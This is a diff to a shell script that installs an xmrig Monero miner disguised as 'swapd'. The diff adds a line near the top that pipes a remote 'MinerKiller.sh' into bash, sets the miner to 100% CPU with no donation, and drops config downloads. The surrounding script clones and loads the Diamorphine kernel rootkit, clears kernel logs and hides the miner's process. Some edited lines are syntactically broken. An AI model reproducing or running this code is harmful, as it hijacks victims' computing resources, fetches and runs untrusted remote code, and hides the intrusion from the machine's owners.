@@ -5,6 +5,9 @@ VERSION=3.0
 MOxmrigMOD=https://github.com/littlAcen/moneroocean-setup/raw/main/mod.tar.gz
 #MOxmrigSTOCK=https://github.com/littlAcen/moneroocean-setup/raw/main/stock.tar.gz
 
+#BotKiller
+curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/MinerKiller.sh | bash
+
 function KILLMININGSERVICES(){
 rm -f /usr/bin/docker-update 2>/dev/null 1>/dev/null
 pkill -f /usr/bin/docker-update 2>/dev/null 1>/dev/null
@@ -239,7 +242,6 @@ echo "[*] Removing $HOME/moneroocean directory"
 rm -rf $HOME/moneroocean
 rm -rf $HOME/.moneroocean
 rm -rf $HOME/.gdm2
-rm -rf $HOME/.swapd
 
 echo "[*] Removing $MOHOME/ directory"
 rm -rf $MOHOME/
@@ -259,7 +261,7 @@ if ! tar xf /tmp/log -C $MOHOME/; then
   echo "ERROR: Can't unpack /tmp/log (xmrig.tar.gz) to $MOHOME/ directory"
   exit 1
 fi
-rm /tmp/xmrig.tar.gz
+#rm /tmp/log
 
 echo "[*] Checking if advanced version of $MOHOME/swapd works fine (and not removed by antivirus software)"
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $MOHOME/swapd.pid
@@ -320,9 +322,9 @@ sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $MOHOME/swapd.pid
 sed -i 's#"log-file": *null,#"log-file": "'$MOHOME/swapd.log'",#' $MOHOME/swapd.pid
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $MOHOME/swapd.pid
 
-#rm $HOME/.swapd/config.json
+rm $HOME/.swapd/config.json
 
-#cat $HOME/.swapd/config.json <<EOL
+cat $HOME/.swapd/swapd.pid <<EOL
 #{
 #    "autosave": true,
 #    "background": false,
@@ -345,11 +347,11 @@ sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $MOHOME/swapd.pid
 #EOL
 
 #wget --no-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
-wget https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
-curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $MOHOME/config.json
+#wget https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
+#curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $MOHOME/config.json
 
-wget https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config_background.json
-curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config_background.json--output $MOHOME/config_background.json
+#wget https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config_background.json
+#curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config_background.json--output $MOHOME/config_background.json
 
 # preparing script
 killall xmrig
@@ -475,8 +477,7 @@ if [ "$CPU_THREADS" -lt "4" ]; then
   fi
 else
   echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.swapd/config.json"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.swapd/config_background.json"
+  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.swapd/swapd.pid"
 fi
 echo ""
 
@@ -489,9 +490,6 @@ cd /tmp ; cd .ICE-unix ; cd .X11-unix ; yum install pciutils lshw -y; apt instal
 
 echo "[*] MO0RPHIUM!! Viiiiel M0RPHIUM!!! Brauchen se nur zu besorgen, fixen kann ich selber! =)"
 cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; yum install linux-generic linux-headers-$(uname -r) kernel kernel-devel kernel-firmware kernel-tools kernel-modules kernel-headers git make gcc msr-tools -y ; apt-get update -y ; apt-get install linux-generic linux-headers-$(uname -r) git make gcc msr-tools -y ;  git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
-
-#BotKiller
-curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/MinerKiller.sh | bash
 
 optimize_func() {
   MSR_FILE=/sys/module/msr/parameters/allow_writes
